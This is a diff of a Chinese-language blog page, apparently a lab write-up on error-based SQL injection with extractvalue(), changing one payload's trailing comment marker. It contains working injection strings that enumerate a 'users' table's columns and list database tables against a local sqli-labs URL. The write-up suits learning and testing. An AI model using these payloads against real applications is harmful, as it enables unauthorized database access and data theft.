@@ -25,7 +25,7 @@ SQL Server Asc.."><meta name="generator" content="Hexo 6.3.0"><link rel="alterna
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46634468/article/details/120692475">【精选】SQL报错型注入原理-详细讲解 extractvalue()、updatexml()、floor() 的报错原因-CSDN博客</a></p>
 <p>如果<code>extractvalue()</code>爆出的字段数不够，在条件中加入not来去除已经查询到的数据，然后显示未查询到的</p>
 <p>such as：</p>
-<pre><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and column_name not in (&#39;user_id&#39;,&#39;first_name&#39;,&#39;last_name&#39;,&#39;user&#39;,&#39;avatar&#39;,&#39;last_login&#39;,&#39;failed_login&#39;)))) --+
+<pre><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and column_name not in (&#39;user_id&#39;,&#39;first_name&#39;,&#39;last_name&#39;,&#39;user&#39;,&#39;avatar&#39;,&#39;last_login&#39;,&#39;failed_login&#39;)))) --
 </code></pre>
 <p><code>extractvalue()</code>第二个参数似乎只能注入<code>concat()</code>（-笔者目前所知），但是<code>concat()</code>的参数可以嵌套<code>group_concat()</code>:</p>
 <pre><code>127.0.0.1/Less-5/?id=1&#39;%20 union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+
